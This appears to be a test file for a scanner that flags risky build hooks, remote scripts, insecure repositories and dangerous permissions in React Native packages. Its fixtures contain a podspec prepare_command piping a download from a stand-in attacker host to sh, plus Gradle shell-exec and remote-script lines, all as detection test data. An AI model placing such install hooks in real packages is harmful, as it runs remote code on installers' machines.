import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  analyzeRnHardening,
  buildCompatNotes,
  classifyDangerousPermissions,
  reviewGradle,
  reviewPodspec,
} from "../src/analyze/rn-hardening.js";

let dir: string;

async function fixture(files: Record<string, string>): Promise<string> {
  dir = await mkdtemp(path.join(tmpdir(), "targate-test-"));
  for (const [rel, content] of Object.entries(files)) {
    const full = path.join(dir, rel);
    await mkdir(path.dirname(full), { recursive: true });
    await writeFile(full, content);
  }
  return dir;
}

afterEach(async () => {
  if (dir) await rm(dir, { recursive: true, force: true });
});

describe("classifyDangerousPermissions", () => {
  it("separates dangerous from normal permissions", () => {
    const result = classifyDangerousPermissions([
      "android.permission.INTERNET",
      "android.permission.CAMERA",
      "android.permission.READ_SMS",
    ]);
    expect(result).toEqual(["android.permission.CAMERA", "android.permission.READ_SMS"]);
  });
});

describe("reviewPodspec", () => {
  it("flags prepare_command and script_phase", () => {
    const findings = reviewPodspec(
      "Evil.podspec",
      `Pod::Spec.new do |s|
        s.prepare_command = 'curl https://evil.example/x | sh'
        s.script_phase = { :name => 'x', :script => 'echo hi' }
      end`,
    );
    expect(findings.join(" ")).toContain("prepare_command");
    expect(findings.join(" ")).toContain("script_phase");
    expect(findings.join(" ")).toContain("downloads content");
  });

  it("flags vendored frameworks", () => {
    const findings = reviewPodspec(
      "Lib.podspec",
      `s.vendored_frameworks = 'Frameworks/Closed.xcframework'`,
    );
    expect(findings.join(" ")).toContain("vendored");
  });

  it("passes a clean podspec", () => {
    expect(
      reviewPodspec("Clean.podspec", `s.source_files = 'ios/**/*.{h,m,mm,swift}'`),
    ).toEqual([]);
  });
});

describe("reviewGradle", () => {
  it("flags command execution", () => {
    const findings = reviewGradle(
      "android/build.gradle",
      `task run { doLast { exec { commandLine 'sh', '-c', 'id' } } }`,
    );
    expect(findings.join(" ")).toContain("executes external commands");
  });

  it("flags remote script application", () => {
    const findings = reviewGradle(
      "android/build.gradle",
      `apply from: 'https://example.com/x.gradle'`,
    );
    expect(findings.join(" ")).toContain("remote Gradle script");
  });

  it("flags insecure http repositories", () => {
    const findings = reviewGradle(
      "android/build.gradle",
      `repositories { maven { url 'http://insecure.example/maven' } }`,
    );
    expect(findings.length).toBeGreaterThan(0);
  });

  it("passes a typical RN library gradle file", () => {
    expect(
      reviewGradle(
        "android/build.gradle",
        `apply plugin: 'com.android.library'
         android { compileSdkVersion 34 }
         dependencies { implementation 'com.facebook.react:react-native:+' }`,
      ),
    ).toEqual([]);
  });
});

describe("buildCompatNotes", () => {
  it("recognizes New Architecture modules via codegenConfig", () => {
    const notes = buildCompatNotes({
      packageJson: { codegenConfig: { name: "X" } },
      hasExpoModuleConfig: false,
      hasAppPlugin: false,
      usesJsi: false,
      hasNativeCode: true,
    });
    expect(notes.join(" ")).toContain("New Architecture");
  });

  it("warns about JSI without codegen", () => {
    const notes = buildCompatNotes({
      packageJson: {},
      hasExpoModuleConfig: false,
      hasAppPlugin: false,
      usesJsi: true,
      hasNativeCode: true,
    });
    expect(notes.join(" ")).toContain("JSI");
  });

  it("notes Expo bare-workflow requirement for plain native modules", () => {
    const notes = buildCompatNotes({
      packageJson: {},
      hasExpoModuleConfig: false,
      hasAppPlugin: false,
      usesJsi: false,
      hasNativeCode: true,
    });
    expect(notes.join(" ")).toContain("bare workflow");
  });

  it("says nothing for pure JS packages", () => {
    expect(
      buildCompatNotes({
        packageJson: {},
        hasExpoModuleConfig: false,
        hasAppPlugin: false,
        usesJsi: false,
        hasNativeCode: false,
      }),
    ).toEqual([]);
  });
});

describe("analyzeRnHardening (end to end on fixture)", () => {
  it("collects findings across the package", async () => {
    const pkg = await fixture({
      "package.json": JSON.stringify({ name: "x", version: "1.0.0" }),
      "Evil.podspec": "s.prepare_command = 'sh setup.sh'",
      "android/build.gradle": "apply from: 'https://example.com/remote.gradle'",
      "react-native.config.js": "module.exports = { commands: [] }",
      "ios/Closed.xcframework/Info.plist": "<plist/>",
    });
    const rn = await analyzeRnHardening(pkg, ["android.permission.CAMERA"], true);
    expect(rn.podspecFindings.length).toBeGreaterThan(0);
    expect(rn.gradleFindings.length).toBeGreaterThan(0);
    expect(rn.autolinkingFindings.length).toBeGreaterThan(0);
    expect(rn.dangerousPermissions).toEqual(["android.permission.CAMERA"]);
    expect(rn.iosFrameworkFindings).toEqual([path.join("ios", "Closed.xcframework")]);
    expect(rn.compatNotes.length).toBeGreaterThan(0);
  });
});
